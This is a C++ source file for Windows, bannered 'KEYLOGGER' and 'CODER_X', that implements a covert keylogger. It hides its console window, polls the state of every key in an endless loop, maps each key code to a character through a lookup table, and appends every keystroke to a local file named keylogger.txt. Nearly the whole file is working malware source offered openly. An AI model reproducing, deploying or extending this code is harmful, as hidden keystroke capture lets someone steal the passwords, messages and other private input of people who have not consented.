   /*                       $$\   $$\ $$$$$$$$\ $$\     $$\ $$\        $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$$\ $$$$$$$\  
                            $$ | $$  |$$  _____|\$$\   $$  |$$ |      $$  __$$\ $$  __$$\ $$  __$$\ $$  _____|$$  __$$\ 
                            $$ |$$  / $$ |       \$$\ $$  / $$ |      $$ /  $$ |$$ /  \__|$$ /  \__|$$ |      $$ |  $$ |
                            $$$$$  /  $$$$$\      \$$$$  /  $$ |      $$ |  $$ |$$ |$$$$\ $$ |$$$$\ $$$$$\    $$$$$$$  |
                            $$  $$<   $$  __|      \$$  /   $$ |      $$ |  $$ |$$ |\_$$ |$$ |\_$$ |$$  __|   $$  __$$< 
                            $$ |\$$\  $$ |          $$ |    $$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |
                            $$ | \$$\ $$$$$$$$\     $$ |    $$$$$$$$\  $$$$$$  |\$$$$$$  |\$$$$$$  |$$$$$$$$\ $$ |  $$ |
                            \__|  \__|\________|    \__|    \________| \______/  \______/  \______/ \________|\__|  \__|                */
                                    
#define _WIN32_WINNT 0x0500 //getConsoleWindow()
#include <iostream>
#include <string>
#include <map> //Array asociativo
#include <windows.h>

using namespace std;

int main()
{
    /* 
   Associative array. the key is the decimal number and the value the character it represents.
    */
    map<int, string> ch;
    ch[1] = " [mouse click] ";
    ch[2] = " [mouse menu context] ";
    ch[8] = " [Backspace] ";
    ch[9] = " [Tab] ";
    ch[13] = " [Enter] ";
    ch[16] = " [Shift] ";
    ch[17] = " [Control] ";
    ch[18] = " [Alt] ";
    ch[20] = " [Caps LOCK] ";
    ch[27] = " [Esc] ";
    ch[32] = " ";
    ch[37] = " [Left arrow] ";
    ch[38] = " [Up arrow] ";
    ch[39] = " [Right arrow] ";
    ch[40] = " [Down arrow] ";
    ch[44] = " [Print Screen] ";
    ch[45] = " [Insert] ";
    ch[46] = " [Delete] ";
    ch[48] = "0";
    ch[49] = "1";
    ch[50] = "2";
    ch[51] = "3";
    ch[52] = "4";
    ch[53] = "5";
    ch[54] = "6";
    ch[55] = "7";
    ch[56] = "8";
    ch[57] = "9";
    ch[65] = "a";
    ch[66] = "b";
    ch[67] = "c";
    ch[68] = "d";
    ch[69] = "e";
    ch[70] = "f";
    ch[71] = "g";
    ch[72] = "h";
    ch[73] = "i";
    ch[74] = "j";
    ch[75] = "k";
    ch[76] = "l";
    ch[77] = "m";
    ch[78] = "n";
    ch[79] = "o";
    ch[80] = "p";
    ch[81] = "q";
    ch[82] = "r";
    ch[83] = "s";
    ch[84] = "t";
    ch[85] = "u";
    ch[86] = "v";
    ch[87] = "w";
    ch[88] = "x";
    ch[89] = "y";
    ch[90] = "z";
    ch[91] = " [Menu Windows] ";
    ch[96] = "0";
    ch[97] = "1";
    ch[98] = "2";
    ch[99] = "3";
    ch[100] = "4";
    ch[101] = "5";
    ch[102] = "6";
    ch[103] = "7";
    ch[104] = "8";
    ch[105] = "9";
    ch[106] = "*";
    ch[107] = "+";
    ch[109] = "-";
    ch[110] = ".";
    ch[111] = "/";
    ch[112] = " [F1] ";
    ch[113] = " [F2] ";
    ch[114] = " [F3] ";
    ch[115] = " [F4] ";
    ch[116] = " [F5] ";
    ch[117] = " [F6] ";
    ch[118] = " [F7] ";
    ch[119] = " [F8] ";
    ch[120] = " [F9] ";
    ch[121] = " [F10] ";
    ch[122] = " [F11] ";
    ch[123] = " [F12] ";
    ch[144] = " [ Num Lock ] ";
    ch[145] = " [Scroll Lock] ";
    ch[186] = "`";
    ch[187] = "+";
    ch[188] = ",";
    ch[189] = "-";
    ch[190] = ".";
    ch[191] = "ç";
    ch[192] = "ñ";
    ch[219] = "'";
    ch[220] = "º";
    ch[221] = "¡";
    ch[222] = "´";
    ch[226] = "<";

    /* Handler for a file where the keystrokes will be saved */
    FILE *log;
    /* Variable to create a line break every 50 characters */
    int count = 1;

    /* Hide the console */
    HWND hWnd = GetConsoleWindow();
    /*0 = hidden; 1 = visible */
    ShowWindow(hWnd, 0);

    /*Infinite loop to detect keystrokes */
    while (true)
    {
        /*Go through the number of characters in the ASCII table that are 255 */
        for (int c = 0; c < 256; c++)
        {
            /* If a key is pressed */
            if (GetAsyncKeyState(c) == -32767)
            {
                /* Open the file */
                // a  –---> Opens a file in append mode.  It returns null if file couldn’t be opened.
                log = fopen("keylogger.txt", "a");
                /* If count is equal to 50 include a line break in the file */
                if (count == 50)
                {
                    fputs("\n", log);
                     count = 1;
                }
                /* Write the character of the pressed key to the file*/
                fputs(ch[c].c_str(), log);
                /* Close the file */
                fclose(log);
                /* Increase the value of count by one */
                count++;
            }
        }
    }

    system("PAUSE");
    return 0;
}


/*                                    _______________________________________________________________________
                                     |   $$$$$$\   $$$$$$\  $$$$$$$\  $$$$$$$$\ $$$$$$$\          $$\   $$\  | 
                                     |  $$  __$$\ $$  __$$\ $$  __$$\ $$  _____|$$  __$$\         $$ |  $$ | |
                                     |  $$ /  \__|$$ /  $$ |$$ |  $$ |$$ |      $$ |  $$ |        \$$\ $$  | |
                                     |  $$ |      $$ |  $$ |$$ |  $$ |$$$$$\    $$$$$$$  |         \$$$$  /  |
                                     |  $$ |      $$ |  $$ |$$ |  $$ |$$  __|   $$  __$$<          $$  $$<   |
                                     |  $$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |        $$  /\$$\  |
                                     |  \$$$$$$  | $$$$$$  |$$$$$$$  |$$$$$$$$\ $$ |  $$ |        $$ /  $$ | |
                                     |   \______/  \______/ \_______/ \________|\__|  \__|$$$$$$\ \__|  \__| |
                                     |                                                    \______|           |  
                                     |_______________________________________________________________________|                          */
                                       
     